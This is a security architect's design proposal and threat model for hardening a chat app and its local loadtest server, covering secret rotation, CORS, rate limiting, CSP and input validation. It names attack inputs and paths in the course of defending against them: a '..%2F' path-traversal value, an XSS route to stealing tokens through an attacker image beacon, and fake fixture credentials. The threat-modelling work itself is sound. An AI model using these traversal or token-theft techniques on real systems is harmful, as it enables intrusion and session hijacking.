# DESIGN — Security architecture for production-readiness refactor

**Author**: Security Architect (design council)
**Date**: 2026-08-04
**Status**: PROPOSAL — feeds design council + `docs/THREAT-MODEL.md` (T-12)
**Repo**: `C:\MAYogu_VIASG\chat-app`
**Authored against**: `docs/PRD-prod-refactor.md` (approved, §3.6, §5.1, §6, DoD G-5/G-9/G-10) and `docs/PLAN-prod-refactor.md` (approved, T-01, T-02, T-03, T-06, T-08, T-12).
**Respects decisions (do not relitigate)**: Q-1 rotate+remove (no history rewrite), Q-4 localStorage keep, Q-2 DB required, Q-3 zero-dep migration runner, Q-5 GitHub Actions.

> Perimeter reality check: the loadtest server is a **self-hosted local tool** (`LOADTEST_HOST=127.0.0.1`, `loadtest/config.ts:91`). It is not an internet-facing SaaS. The **internet-facing surface is the chat SPA** (Vite/nginx) + the gateway services. The threat model is proportionate: defense-in-depth for the tool, strict posture for the chat origin. The single most dangerous fact in this repo is that **real secrets are sitting untracked in the working tree** (`loadtest/data/auth-secret.json`, `loadtest/data/accounts-*.json`) — the next `git add .` ships them to history forever (PRD SEC-1 / R-1).

---

## 1. Scope and trust boundaries

```
                 ┌──────────────────────────────────────────────┐
                 │  Browser (SPA)  http://localhost:5173 (dev)  │
                 │  / nginx :80 (prod)  — SAME ORIGIN for both  │
                 │  chat app AND /loadtest dashboard (react-router)│
                 │  localStorage: chat.accessToken/refreshToken  │
                 │               loadtest.auth (admin token)     │
                 └───────┬──────────────────────────┬────────────┘
                         │ REST+WS (Bearer)         │ REST /api/loadtest/*
             ┌───────────▼───────────┐   ┌──────────▼──────────────┐
             │ gateway-auth-service  │   │ loadtest server :3401    │
             │ (auth.controller,     │   │ (127.0.0.1, zero-dep)    │
             │  websocket.gateway)   │   │  - HMAC admin sessions   │
             └───────┬───────────────┘   │  - scrypt admin passwords│
                     │ seeds OTP via     │  - register/login/start  │
             ┌───────▼───────────────┐   │  - /runs history DB      │
             │ Redis (otp:register:*)│   └──────┬──────────────┬────┘
             └───────────────────────┘          │ writes       │ writes
                                 ┌──────────────▼───┐   ┌─────▼────────────┐
                                 │ Postgres (5439)   │   │ dataDir/ (disk)  │
                                 │  run history,     │   │ accounts-*.json  │
                                 │  pool_accounts    │   │ auth-secret.json │
                                 │  (password plain) │   │ settings.json    │
                                 └──────────────────┘   └──────────────────┘
```

Critical structural fact (drives several threats): **the chat SPA and the loadtest dashboard are served from the same origin** (Vite `src/pages/loadtest/*`, `vite.config.ts:15-21` proxies `/api/loadtest` → `:3401`). Therefore `localStorage` is shared between the chat app and the loadtest admin session. An XSS in the chat app can read the loadtest admin token. This is the highest-consequence XSS target and is called out in §5.3.

---

## 2. Threat model v0.1 (feeds `docs/THREAT-MODEL.md`, G-9)

### 2.1 Assets

| ID | Asset | Where it lives | Why it matters |
|---|---|---|---|
| A1 | `LOADTEST_AUTH_SECRET` (HMAC session key) | env `loadtest/.env` + persisted `dataDir/auth-secret.json` (`auth.ts:73-89`) | Signs all admin dashboard sessions; compromise = forge admin token |
| A2 | `LOADTEST_OTP_SECRET` (shared with gateway) | env `loadtest/.env` | Seeds `otp:register:*` / `register:sms:*` in Redis; must match gateway's OTP_SECRET |
| A3 | `LOADTEST_DATABASE_URL` (Postgres creds) | env `loadtest/.env` + default hardcoded `postgresql://appuser:secret@localhost:5439/loadtest` (`config.ts:104`, `db/init.ts:27`) | Full history DB + admin_users + pool_accounts |
| A4 | `LOADTEST_REDIS_URL` (may embed password) | env `loadtest/.env` | Write access to OTP seed keys + queue-count |
| A5 | `pool_accounts.password` (plaintext, `schema.sql:84`) | Postgres + `dataDir/accounts-*.json` | Reusable test-account credentials against the gateway (R-5/D-8) |
| A6 | `admin_users.password_hash` (scrypt, `schema.sql:28`) | Postgres | Admin login credentials |
| A7 | Access/refresh tokens (chat + pool) | `localStorage` (`storage.ts:75-90`, `loadtest-auth-storage.ts:16-47`), `accounts-*.json`, in-memory | Full session impersonation |
| A8 | Run data / metrics / reports | Postgres `runs`, `metric_samples`, `log_events`; `docs/loadtest-reports/` | Operational intelligence; report contains no tokens (verified `report.ts` grep = 0) |
| A9 | Synthetic PII: `email`, `device_info_json` (installationId, fingerprint, userAgent), `date_of_birth`, `country` | Postgres `pool_accounts` (`schema.sql:83-90`) | Synthetic but real-shaped PII; DOB+phone+email mass-residual |

### 2.2 Threat actors

| Actor | Capability | Reach |
|---|---|---|
| T-ext (external attacker) | No credentials; can hit any reachable origin | Only the chat origin + gateway in normal deployment; the loadtest server only if bound to `0.0.0.0` (cluster v1.1) or misconfigured |
| T-xss (XSS victim) | Arbitrary script of attacker's choice in a victim browser session | Full DOM + localStorage of the chat origin (incl. loadtest admin token per §1) |
| T-admin (compromised admin) | A valid dashboard token (stolen or brute-forced) | Full loadtest API: start/stop runs, read history, add allowlist entries, cleanup |
| T-db (DB leak) | Read dump / read-only Postgres access | `pool_accounts` plaintext, `admin_users` hashes, run history |
| T-insider (incidental) | Clone of the repo / a teammate | Whatever landed in git history (the SEC-1 scenario) |

### 2.3 Threat table (top threats, STRIDE-flavored)

| # | Threat | Likelihood | Impact | Current control | Gap | Mitigation (this refactor) |
|---|---|---|---|---|---|---|
| TH-1 | **Secret in git history** (SEC-1/R-1) | **High** — real secrets untracked now; next commit ships them | **High** — auth-secret, OTP_SECRET, DB creds, 1.3MB accounts files (real access tokens) leaked forever | `.gitignore` only covers `.env`/`.env.*` (`..env`:11-14) | `loadtest/data/*` not ignored | T-01 rotate+remove+gitignore; T-02 gitleaks 0-finding gate; pre-commit hook |
| TH-2 | **XSS → token theft** (SEC-4) | **Medium** — chat renders user content; need a script-injection vector | **High** — steals chat AND loadtest admin token (same origin, §1) | none (no CSP, `index.html:1-21`) | No CSP; `[DEBUG-LOGIN]` also leaks deviceInfo to console (`auth.store.ts:45-55,76-83`) | T-08 CSP (block inline + restrict connect-src); remove debug log; ErrorBoundary; keep localStorage per Q-4 but document residual risk |
| TH-3 | **Brute-force admin login** (SEC-5) | **Medium** — dashboard is localhost-default, but cluster/exposed host possible | **High** — full dashboard takeover → start/stop runs, read pool data | none (`api-server.ts:128-382`) | No rate limit on login/register | T-06 rate-limit 5 fail/60s/IP → 429 expiry; `SimpleRateLimiter` is pacing, NOT a 429 limiter (`auth-factory.ts:133-150`) — build `rate-limit.ts` |
| TH-4 | **Register spam / admin account creation** (SEC-6) | **Medium** — `POST /auth/register` is public and unauthenticated | **Medium** — attacker creates admins, pollutes `admin_users`, stays persistent | none (`api-server.ts:387-401`) | No gate | T-06 `LOADTEST_ALLOW_REGISTER` default `false` → 403; gate tests updated in same task (plan already fixed this) |
| TH-5 | **CORS misconfig** (SEC-2) | **Medium** — `*` + Bearer auth; if a token leaks, any origin reads run data | **High** — full run/history/pool metadata read from any origin | `Access-Control-Allow-Origin: *` (`api-server.ts:76-79`) | Wildcard | T-06 `CORS_ORIGIN` allowlist (default `http://localhost:5173`), echo exact origin, `Vary: Origin` |
| TH-6 | **DB PII/credential leak** (D-8/R-5) | **Medium** — requires T-db (backup, misconfig, SQLi) | **Medium-High** — mass synthetic PII + reusable test credentials | none | `pool_accounts.password` plaintext; data files on disk at-rest | T-12 document accept+decide (§6); T-01 gitignore data files; ensure no API returns `password` (verified: `/pools` returns metadata only) |
| TH-7 | **Token in URL query** (SEC-3) | **Medium** — proxy/access-log/`referer` exposure | **Medium** — session hijack | gateway accepts header fallback (`websocket.gateway.ts:147-149`) | Both `src/lib/socket.ts:87` and `loadtest/socket-farm.ts:97` send `query: { token }` | T-08 remove query in both; keep `Authorization: Bearer` header only |
| TH-8 | **Error/stack leakage** | **Low-Medium** — internal errors reachable | **Low** — `err.message` may embed DB/redis internals | `fail()` envelope is clean (`api-server.ts:91-93`) but 500 catch returns `err.message` (`api-server.ts:384`) | Full error surfaced to client | T-06/T-07 generic 500 message + `requestId`; log full error server-side only |
| TH-9 | **Path traversal via runId** | **Low** — requires authenticated admin | **Medium** — arbitrary `.json` read on disk via `POST /api/loadtest/cleanup` (`poolPath` → `fs.readFileSync`, `api-server.ts:289-301`) | `isRunPath` blocks literal `/` (`api-server.ts:453-458`) but `decodeURIComponent` in `runIdFromPath` (`api-server.ts:447-450`) decodes `%2F` AFTER the check | `..%2F` passes the segment check; `cleanup` runId is used in a filesystem path | T-06 validate runId format (`/^[a-z0-9-]{1,64}$/i`) before any filesystem use; `path.resolve` + prefix check |

**Lower-priority findings (record, fix opportunistically):**
- **Weak RNG for OTP + test passwords** — `seedOtp`/`seedSmsOtp` use `Math.random()` for the 6-digit OTP (`auth-factory.ts:71,85`); `genPassword`/`randomHex`/`uuidV4` use `Math.random()` (`util.ts:55-89`). These gate registration and pool credentials. Low likelihood (test tool, OTP short-lived), cheap fix: `crypto.randomInt`. Include in T-06 hardening.
- **`decodeURIComponent` throws on malformed input** (`%E0%A4%A`) → caught by `handle` catch → 500. Minor; the T-06 validation pass should sanity-check the path before decoding.
- **`GET /auth/check/:refreshToken`** at the gateway puts the refresh token in the URL path (`auth.controller.ts:118-132`) — **gateway contract, OUT OF SCOPE** (read-only). Our frontend does not use it; do not add client-side usage.
- **`newRunId()` collision across restart** (`config.ts:219-225`) — run_id is a PK and URL path segment; collision overwrites history. T-03 fixes the seed.
- **`docs/loadtest-reports/*` not gitignored** — reports contain run config (gatewayUrl, targets) but no tokens (verified). Keep one sample report (G-7), gitignore the rest or accept; explicit decision in T-12.

---

## 3. Secret lifecycle (T-01)

### 3.1 What to rotate, and the order

| Order | Secret | Source of truth today | Rotate effect | Why this order |
|---|---|---|---|---|
| 1 | **DB password** (inside `LOADTEST_DATABASE_URL`) | `loadtest/.env` + hardcoded default `config.ts:104` | Old password invalidated on Postgres | Do the instance-level change FIRST so the app never points at a dead credential or a live-but-leaked one. Create new role/password on Postgres, verify connect, then update `.env`. |
| 2 | **`LOADTEST_OTP_SECRET`** | `loadtest/.env` | Seeded OTPs never verify against the gateway → register flow fails | **Coordination required**: the tool's OTP_SECRET MUST equal the gateway's OTP_SECRET (`auth-factory.ts:70-88` seeds keys the gateway reads). Rotate both at once, or rotate the tool's value to match the gateway's new value. This is a two-party rotation — do it as one step, verify with one register, then commit `.env` (gitignored). |
| 3 | **`LOADTEST_AUTH_SECRET`** | env `loadtest/.env` or `dataDir/auth-secret.json` | **All existing admin sessions invalidated** (HMAC verify fails → 401 → re-login) | This is actually the *proof* of rotation: old tokens die. Put it last so a mid-rotation admin session that breaks is not blamed on the DB/OTP changes. |
| 4 | **`LOADTEST_REDIS_URL`** (if it embeds a password) | `loadtest/.env` | Redis auth invalidated | Only if the URL contains a credential; rotate Redis password + URL together. |

### 3.2 Rotation procedure (step-by-step, T-01)

1. **Back up out of the repo** (Q-1): copy `loadtest/data/` and `loadtest/.env` to `%USERPROFILE%\.mayogu-secrets\` (outside the repo, naturally git-ignored). This is the rollback material for `visible behavior` — but **never rotate back to a leaked value**.
2. Generate new values: `node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"` for each secret (≥ 32 bytes hex). Do NOT reuse any leaked value.
3. DB: `ALTER ROLE appuser PASSWORD '<new>'` (or new role), verify `LOADTEST_DATABASE_URL` connects, THEN update `loadtest/.env`.
4. OTP: coordinate with gateway owner; set the tool's `LOADTEST_OTP_SECRET` to the gateway's new value; verify one register end-to-end.
5. Auth: set `LOADTEST_AUTH_SECRET` in `loadtest/.env` (fixed, not file-persisted — see 3.3 note).
6. Delete `loadtest/data/auth-secret.json`, `loadtest/data/accounts-*.json`, `loadtest/data/settings.json` from the working tree; add `loadtest/data/.gitkeep`.
7. Run `npm run secret:scan` (gitleaks) → 0 findings; `git status` clean of `loadtest/data/`.

### 3.3 How to prove rotation

- `git check-ignore` returns ignored for all four groups: `loadtest/data/auth-secret.json`, `loadtest/data/accounts-*.json`, `loadtest/data/settings.json`, `loadtest/.env` (G-5).
- `git status` lists no file under `loadtest/data/`.
- `grep -r '<old-secret-value>' .` = 0 across the repo (grep the old values, not the new ones).
- gitleaks CI = 0 findings.
- **Auth**: a token created with the old secret fails `verifySessionToken(newValue)` → `{ ok:false, reason:'invalid' }`. Add a unit test `auth.test.ts`: `createSessionToken` with secret A → `verifySessionToken` with secret B → invalid. This is the automated proof that "rotated".
- **DB**: old password fails `psql`; new password works.
- **OTP**: `seedOtp` with new secret → gateway `verify-email` accepts; with old secret → rejects.

### 3.4 `.gitignore` patterns (explicit, not wildcard-blind)

```gitignore
# loadtest runtime data — contains real secrets (auth-secret, token pools, settings)
loadtest/data/*
!loadtest/data/.gitkeep
loadtest/settings.json
*.tsbuildinfo
```

Rationale:
- `loadtest/data/*` is directory-scoped, not a blind global `*` — it cannot accidentally ignore `src/` or `docs/`.
- `!loadtest/data/.gitkeep` re-includes the directory placeholder so the folder survives checkout.
- `loadtest/settings.json` is a redundant safety net for the case where `dataDir` is overridden via `LOADTEST_DATA_DIR` (the file could land at a different path).
- `.env` / `.env.*` / `!.env.example` already exist (`.gitignore:11-14`) and correctly cover `loadtest/.env` (basename pattern matches at any depth) while keeping both `.env.example` templates tracked. The `!.env.example` negation works because `loadtest/` itself is not ignored.
- **Do NOT** add a global `*.json` or `data/` ignore — that would blind gitleaks and hide legit fixtures.

### 3.5 gitleaks allowlist strategy (T-02)

The test fixtures contain fake credentials that stock gitleaks rules WILL flag:
- `loadtest/__tests__/api-server.test.ts:15` — `postgresql://appuser:secret@localhost:5439/loadtest_test_api`
- `loadtest/__tests__/api-server.test.ts:16` — `test-secret-for-api-tests`
- `loadtest/__tests__/store.test.ts:11` — same fake DB URL pattern.

Allowlist rules (`.gitleaks.toml`), scoped tight:
```toml
[allowlist]
description = "test fixtures only — fake, non-production credentials"
paths = [
  '''__tests__/.*\.test\.ts''',
  '''__tests__/.*\.test\.tsx''',
  '''.*\.test\.ts''',
]
regexes = [
  '''test-secret-for-api-tests''',
  '''postgresql://appuser:secret@localhost:5439/loadtest_test''',
]
```
Rules:
- Scope by **path** (`__tests__/`) AND **exact regex** for the fake value. Never allowlist a generic pattern like `secret` or `password` — that would hide real secrets.
- After T-03 replaces the `appuser:secret` runtime default, the **only** remaining occurrences are the test fixtures above; keep them behind the path allowlist and add a `// test-only` comment per the plan.
- Set `fail-on-any` in CI (`gitleaks detect --fail-on-any`) and in the pre-commit hook (husky). On Windows, prefer the `gitleaks/gitleaks-action` (Go binary) over the npm wrapper.

---

## 4. Auth hardening (T-06)

### 4.1 CORS design

- **Config**: `CORS_ORIGIN` env, comma-separated allowlist of exact origins. Default `http://localhost:5173` (Vite dev origin, `vite.config.ts:12`). Production: set to the real dashboard origin (nginx host).
- **Behavior** (replaces `api-server.ts:76-79` `*`):
  - If request has an `Origin` header and it is in the allowlist → set `Access-Control-Allow-Origin: <exact origin>` (echo, never `*`) + `Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS` + `Access-Control-Allow-Headers: Content-Type,Authorization` + `Vary: Origin`.
  - If `Origin` not in allowlist → **set no CORS headers** (browser blocks; non-browser clients like curl/HealthCheck send no Origin and are unaffected).
  - Preflight `OPTIONS` → **204** with the same headers + `Access-Control-Max-Age: 600` (current code already returns 204 at `api-server.ts:130-134`; keep, add the max-age + conditional origin).
  - Do **not** set `Access-Control-Allow-Credentials` (auth is Bearer-header, not cookies).
- **Dev-vs-proxy trap (R-7)**: Vite proxy uses `changeOrigin: true` (`vite.config.ts:19`) so requests reach the loadtest server with `Origin: http://localhost:5173`. `CORS_ORIGIN` must include it or the dashboard breaks in dev. Document in README.

### 4.2 Rate-limit design (new `loadtest/rate-limit.ts`, zero-dep)

**Do NOT reuse `SimpleRateLimiter`** (`auth-factory.ts:133-150`): it is a pacing limiter (`acquire()` sleeps), not a per-IP 429 limiter. It stays for the load generator's registerRamp pacing.

New module — in-memory fixed-window per-IP, single-process (the tool is single-process; document that cluster v1.1 needs a shared store):

| Route | Limit | Window | Response |
|---|---|---|---|
| `POST /auth/login` | 5 **failures** | 60s / IP | 429 `{ success:false, statusCode:429, message:'Quá nhiều lần đăng nhập sai, thử lại sau 60s', retryAfterSec }` + `Retry-After: n` header |
| `POST /auth/register` | 5 / 60s / IP | 60s | 429 (same shape; gate 403 fires first when register disabled) |
| `POST /start` | 1 / 10s / IP | 10s | 429 `{ ..., retryAfterSec: 10 }` |
| whole API | token bucket 120 / 10s / IP | 10s | 429 (must NOT break the dashboard's 1s poll of `/status` + `/metrics` → set the bucket ≥ 2 req/s + margin, or exempt `GET /status` and `GET /metrics`) |

Design details:
- Count **failures only** for login (reset the counter on a successful login for that IP+identifier). This is what US-SEC-4 ("5 login sai / 60s") requires.
- IP = `req.socket.remoteAddress`. **Do not trust `x-forwarded-for`** for a local tool — it is spoofable and the tool binds 127.0.0.1. If the tool is ever put behind a proxy (cluster), revisit.
- 429 shape is the standard envelope + `retryAfterSec` so the frontend can render a countdown; add `X-RateLimit-Limit/Remaining/Reset` on throttled routes for observability.
- Memory: `Map<ip, {count, windowStart}>` with expiry cleanup on access (no timers). Bound the map size (e.g., 10k entries) to avoid memory growth from many spoofed IPs.
- Test env: `LOADTEST_RATE_LIMIT_OFF=1` (or env-scaled limits) so E2E/contract tests don't hit 429 (plan R-6). Document in CI.

### 4.3 Register gate

- `LOADTEST_ALLOW_REGISTER` default `false` → `POST /api/loadtest/auth/register` returns **403** `{ success:false, statusCode:403, message:'Đăng ký đã bị tắt (LOADTEST_ALLOW_REGISTER=false)' }` before any body validation.
- When `true` (dev), register behaves exactly as today (`api-server.ts:387-401`).
- **Do not** make the gate "smart" (e.g., first user only) — keep it a binary env flag; a registration-invite token is a future feature (out of scope).
- **Test coupling (already fixed in plan)**: `api-server.test.ts:89-113,166-170` expects register → 200; update `beforeAll` to set `LOADTEST_ALLOW_REGISTER=true` in the env override **in T-06 itself**, not T-11.

### 4.4 Error envelope (no stack / PII leak)

Standard shape (already the convention, `api-server.ts:91-93`):
`{ success, statusCode, message, error?, timestamp, requestId?, errors?, warnings? }`
- `error`: stable machine code (e.g., `JSON_INVALID`, `RATE_LIMITED`, `REGISTER_DISABLED`).
- `requestId`: generated per request in T-06, echoed in the envelope, threaded into the structured logger (T-07) for correlation.
- **500 handler fix** (`api-server.ts:384`): never return `err.message` to the client. Log `{ requestId, method, path, error: err.message, stack }` server-side only; return `{ success:false, statusCode:500, message:'Lỗi server, xem log với requestId', requestId }`.
- Do not log `Authorization` headers, token bodies, or `password` fields anywhere (structured logger rule, T-07).

### 4.5 Review of existing crypto primitives (verify + flag)

**HMAC session token (`loadtest/auth.ts`) — SOUND, keep.**
- `createSessionToken` (`auth.ts:33-43`): `base64url(payload).base64url(HMAC-SHA256)`, exp set server-side. Correct.
- `verifySessionToken` (`auth.ts:46-67`): recomputes the HMAC over the body (does not decode-and-trust), `crypto.timingSafeEqual` after a length check, then parses payload and enforces `exp < Date.now()`. This is the correct construction. No findings.
- **One flag**: `loadAuthSecret` (`auth.ts:73-89`) falls back to `crypto.randomBytes(32)` **per-process** if no env and no file — meaning sessions silently invalidate on every restart in that configuration. That behavior is documented (PRD A3) but after T-01 the env MUST be set explicitly; treat the file-fallback as a legacy path and remove it in the refactor (or keep it only for `dataDir` outside the repo). The file is the SEC-1 source; delete it in T-01.

**scrypt password (`loadtest/db/password.ts`) — SOUND, keep.**
- `hashPassword` (`password.ts:14-18`): `scryptSync(password, salt16, 64)` with N=16384, r=8, p=1, format `scrypt$N$r$p$salt$hash`. Memory = 128·N·r = 16 MB, under the 32 MB default `maxmem` — no `maxmem` bump needed. Good.
- `verifyPassword` (`password.ts:21-39`): parses the stored hash, re-derives with the **stored** N/r/p, length-checks then `timingSafeEqual`. Note: it trusts the stored N/r/p — an attacker who can write the DB can weaken the hash. That's already game-over (DB write), so acceptable; document it.
- No changes required. Do not switch to bcrypt/argon2 (zero-dep, PRD §5.1).

**One unforced weakness to fix early**: `seedOtp`/`seedSmsOtp` use `Math.random()` for the 6-digit OTP (`auth-factory.ts:71,85`). Swap to `crypto.randomInt(0, 1_000_000)` padded to 6 digits — a 3-line change, no dependency, removes a predictable-OTP weakness. Same for `genPassword`/`randomHex`/`uuidV4` in `util.ts:55-89` (test-account passwords become predictable if the RNG state is recoverable — low likelihood, free to fix).

---

## 5. Token handling (T-08)

### 5.1 Remove token from socket query — both places

- `src/lib/socket.ts:87` — `query: { token }` in the `io()` options.
- `loadtest/socket-farm.ts:97` — `query: { token }` in the `io()` options (the plan correctly catches this second site).
- Keep `extraHeaders: { Authorization: 'Bearer ' + token }` in both (`socket.ts:88`, `socket-farm.ts:98`).
- Contract confirmation (read-only): the gateway reads `client.handshake.query?.token` **first**, then falls back to `client.handshake.headers?.authorization` (`websocket.gateway.ts:147-149`), and strips `Bearer ` before verifying (`websocket.gateway.ts:159`). So removing the query keeps the connection working via the header fallback. No gateway change needed.
- Add a regression test asserting the socket.io options object contains no `query.token` (frontend unit test, T-09).

### 5.2 CSP design

**Production (nginx `docker/nginx.conf`, T-12) — strict:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' ws: wss:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```
- `style-src 'unsafe-inline'` is required (Tailwind/React inline style attributes; the plan already includes it). `'unsafe-inline'` for styles does **not** enable script injection.
- `connect-src 'self' ws: wss:` — in prod the gateway and socket are same-origin (nginx proxies `/auth`, `/socket.io`); `ws: wss:` is a deliberate relaxation so the socket transport is not origin-bound. Trade-off accepted: `script-src 'self'` means an attacker needs a script-injection vector first, at which point `connect-src` is the exfiltration choke point. A tighter variant (`ws://<gateway-host> wss://<gateway-host>`) is recorded as a follow-up if the gateway origin is fixed.
- `frame-ancestors 'none'` + `base-uri 'self'` + `object-src 'none'` kill clickjacking/base-tag/object XSS for free.
- Serve via nginx `add_header` AND a `<meta http-equiv="Content-Security-Policy">` in `index.html` (belt-and-suspenders; meta is honored for all directives except `frame-ancestors`/`sandbox`).

**Development (Vite) — relaxed, documented:**
- `@vitejs/plugin-react` injects an **inline** react-refresh preamble → dev needs `script-src 'self' 'unsafe-inline'` (or a dev-only CSP skipped in the meta).
- `connect-src` must allow `http://localhost:3000` (gateway) + `ws://localhost:3000` (socket) + `ws://localhost:5173` (HMR) + `'self'` (proxied `/api/loadtest`).
- Recommendation: put the strict CSP in prod nginx only, and a dev meta CSP in `index.html` that is `'unsafe-inline'` for scripts. Verify HMR + fonts + socket in dev (plan R-7).

### 5.3 localStorage risk acceptance (Q-4) and how CSP mitigates XSS

- **Decision kept (Q-4)**: chat tokens (`storage.ts:75-90`) and loadtest admin token (`loadtest-auth-storage.ts:16-47`) stay in `localStorage`. Rationale: pure SPA, no server-rendered session, Bearer-token contract, and the refactor principle is "no observable behavior change".
- **Residual risk (documented in THREAT-MODEL.md, G-9)**: an XSS can still read `localStorage` (CSP does not prevent DOM reads). What CSP *does* do — and what makes the residual risk acceptable — is **block the exfiltration path**: `script-src 'self'` blocks injected inline scripts (the dominant chat-XSS vector), and `connect-src 'self' ws: wss:` blocks `fetch`/`WebSocket` to attacker origins (an `<img src=attacker>` beacon is blocked by `img-src 'self' data:`). The remaining leak is a script that smuggles the token back through the app's own origin (e.g., posting it as a chat message) — that is a deliberate same-origin exfil style that CSP alone cannot stop; it requires the app to never echo secrets into content it renders.
- **Cross-context warning (§1)**: because the chat app and the loadtest dashboard share an origin, a chat XSS is also a **loadtest-admin-token theft**. Mitigations in scope: (1) CSP kills the easy exfil; (2) the loadtest admin token is a short-lived (12h, `auth.ts:15`) HMAC session with no refresh — a stolen token is a bounded window; (3) harden the chat's render paths (never dangerouslySetInnerHTML user content — verify in T-08). A stronger fix (separate origin for the dashboard, or `sessionStorage` for the loadtest token) is recorded as a follow-up, not this wave (Q-4).
- **`[DEBUG-LOGIN]` removal** (`auth.store.ts:45-55,76-83`) is itself a token/PII hygiene item: it logs `deviceInfo` (installationId, fingerprint, userAgent preview) and the full error `raw` (which can contain token material) to the console. Remove entirely (US-FE-2).

---

## 6. DB data sensitivity — `pool_accounts.password` (D-8)

### 6.1 The decision — **ACCEPT + DOCUMENT** (no AES-GCM this wave)

The plaintext password is functionally required for pool reuse: `auth-factory.ts:164-167` reads the pool and re-logins with `acc.password`; `writer.ts:171,263` persists it. The plan's R-9 already chose "accept + document, AES-GCM v1.1". As Security Architect, I endorse that with an explicit rationale:

- **The DB leak is the threat, and the DB leak is all-or-nothing.** The attacker who dumps `pool_accounts` on the same host also has the `LOADTEST_DATABASE_URL` env — and in a zero-dep local tool, the AES key would live in the same `.env` on the same host. Encryption adds a key-management layer that does not survive the threat model it claims to stop.
- **The data is synthetic test data**, not real customer PII: `loadtest.*@mayogu.test` emails, generated passwords, synthetic DOB/phone/device. The real dependency is the *gateway test environment* — a leaked pool enables login to a test gateway as a test user, not to production.
- **The cheap controls that matter are already in the wave**: gitignore the data files (T-01), never return `password` from any API (verified: `/pools` returns metadata only, `api-server.ts:312-333`), and document the boundary.

### 6.2 Recommendation and the "do not do" boundary

- **Do now**: document the accept decision in `docs/THREAT-MODEL.md` (G-9) with the exact read surface (who can read: the tool process + anyone with DB access; the `/pools` API does not expose passwords). Add a comment in `schema.sql:84` and `auth-factory.ts:353-364` stating the plaintext intent + the v1.1 AES-GCM plan.
- **Do not do (hard boundary, this wave)**: **no new dependency** for encryption. No `crypto-js`, no `node-forge`, no `kms-sdk`. AES-GCM is available in `node:crypto` if a future wave implements it, but that is a design decision for v1.1, not a bolt-on here. Also do not invent a home-rolled key-derivation layer (worse than the honest plaintext).
- **v1.1 record (T-12)**: AES-256-GCM with a key from `LOADTEST_POOL_ENCRYPTION_KEY` (separate from AUTH_SECRET), `nonce` per row, auth-tag stored with ciphertext, key rotation = re-encrypt on import. Decision deferred until the DB is actually shared/remote.

---

## 7. Input validation (T-06)

### 7.1 `readBody` — 1 MB limit + 400 on malformed JSON

Replaces `api-server.ts:95-105` (currently: unbounded, swallows parse errors → `{}`):
- Stream chunks, **enforce a cumulative limit of 1 MiB** (`1024*1024`).
- Over limit → **413** `{ success:false, statusCode:413, message:'Body quá lớn (tối đa 1MB)' }` (and destroy the request stream to stop reading).
- `JSON.parse` failure → **400** `{ success:false, statusCode:400, message:'JSON body không hợp lệ' }` (US-API-1).
- Empty body → `{}` (some routes are bodyless-optional).
- If the parsed value is not a plain object (array/string/number/null) → 400 as well (defensive).
- Extract into `loadtest/http.ts` helper (plan's module split), unit-testable.

### 7.2 `validateRunRequest` — verified present, keep

`config.ts:126-183` already validates: `gatewayUrl` normalized + allowlist (`config.ts:130-136`), `targetUsers` integer ≥ 1000 ≤ maxTarget, `durationMin` finite > 0 ≤ max, `rampRate` finite > 0 (warn > 2000), `profile` required with all keys finite/≥0 and sum = 100. **No changes needed** — keep as-is, add contract tests (T-11). One addition: also validate `targetUsers`/`durationMin`/`rampRate` are not `NaN` after `Number()` coercion in the route handler (`api-server.ts:166-175` uses `Number(body.x)` which yields `NaN` for garbage → `validateRunRequest` catches via `Number.isFinite`/`Number.isInteger`, so this is already covered).

### 7.3 Path-traversal checks on runId / report endpoints

- **`/api/loadtest/runs/{id}` family** (`api-server.ts:345-375`): runId is used only in parameterized SQL — no filesystem access. The `decodeURIComponent` in `runIdFromPath` can still throw on malformed escape sequences; gate it with a format check.
- **`POST /api/loadtest/cleanup`** (`api-server.ts:289-301`): `runId` from the body flows into `poolPath(dataDir, runId)` → `fs.readFileSync` (`auth-factory.ts:101-103`). **This is the real traversal vector** — validate `runId` against `/^[a-z0-9-]{1,64}$/i` (or `/^lt[a-z0-9]{1,16}$/i`) before any filesystem use, and additionally `path.resolve` the result and assert it starts with `path.resolve(dataDir) + path.sep`.
- **`GET /api/loadtest/report/export`** (`api-server.ts:254-271`): `format` is already whitelisted (`md`/`csv`, else `json`); the filename is built from the server-generated `r.runId` — low risk, but add a `Content-Disposition` filename sanitizer (strip `"`/CR/LF) as defense-in-depth.
- **`GET /api/loadtest/users`** `filter` param (`api-server.ts:230`): verify `queryUsers` uses a parameterized `LIKE` (not string interpolation) — add to the T-11 contract test checklist.

---

## 8. DoD mapping (G-5 / G-9 / G-10)

| Gate | Requirement | Where this design delivers |
|---|---|---|
| **G-5** | gitleaks 0 finding; `git check-ignore` matches `loadtest/data/*` + `*.env` | §3.3 (proof), §3.4 (patterns), §3.5 (allowlist scope) |
| **G-9** | THREAT-MODEL.md: token flow, CSP, localStorage, rate-limit, CORS, register gate, pool plaintext + control per item | §2 (threat table with controls), §4, §5, §6 — this doc is the source the Tech Writer converts for T-12 |
| **G-10** | no `[DEBUG-LOGIN]`; log JSON has runId/requestId; API counters | §5.3 (debug log removal), §4.4 (requestId + no secret logging), T-07 consumes `requestId` |

---

## 9. Prioritized controls — the first three to ship

1. **T-01 rotate + remove + gitignore** (KILLS TH-1, the only *guaranteed* breach in the repo). Nothing else matters until the working tree is clean and gitleaks is green.
2. **T-06 CORS allowlist + register gate + rate-limit** (TH-3, TH-4, TH-5) — three server-side controls in one task, all zero-dep, all testable (400/403/429/CORS contract tests).
3. **T-08 CSP + remove socket query token + delete `[DEBUG-LOGIN]`** (TH-2, TH-7) — the chat origin is the only internet-facing surface this repo owns; CSP is the single highest-leverage control there.

Everything else (error-envelope hygiene, path traversal, RNG hardening, pool-plaintext documentation) is defense-in-depth that ships within the same tasks without new scope.

---

## 10. Conflicts / notes for the design council

- **No conflicts with the plan found.** The plan already corrected the two issues that would have bitten this design: (a) `SimpleRateLimiter` is not a per-IP 429 limiter (new `rate-limit.ts` is correct), and (b) `socket-farm.ts:97` was added to T-08's scope. This design endorses both.
